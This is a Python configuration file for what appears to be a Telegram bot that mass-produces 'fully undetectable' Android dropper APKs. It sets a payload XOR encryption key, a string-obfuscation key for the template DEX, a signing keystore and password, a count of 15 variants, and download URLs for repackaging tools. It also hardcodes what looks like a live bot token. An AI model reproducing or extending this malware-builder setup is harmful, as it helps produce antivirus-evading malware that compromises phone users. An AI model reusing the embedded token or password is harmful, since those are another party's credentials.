import os

BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"

_HOME = os.path.expanduser("~")
_HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(_HOME, "tools")

JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")

KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
KEYSTORE_PASS = "fudbot123"
KEY_ALIAS     = "androidkey"

TEMPLATE_APK  = os.path.join(_HERE, "template.apk")
VARIANTS_DIR  = os.path.join(TOOLS_DIR, "variants")

WORK_DIR = os.path.join(_HOME, "fud_workspace")

PAYLOAD_XOR_KEY = bytes([
    0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
    0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
    0x8D, 0x4C, 0x1A, 0xE3, 0x7F, 0x92, 0xD5, 0x6B,
    0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
])

# String obfuscation key (template DEX ke andar)
STRING_XOR_KEY = "K3y_Dr0pp3r_V5_XoR_2025"

VARIANT_COUNT = 15

URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jre_x64_linux_hotspot_17.0.11_9.tar.gz"
URL_APKTOOL    = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
URL_BUILDTOOLS = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
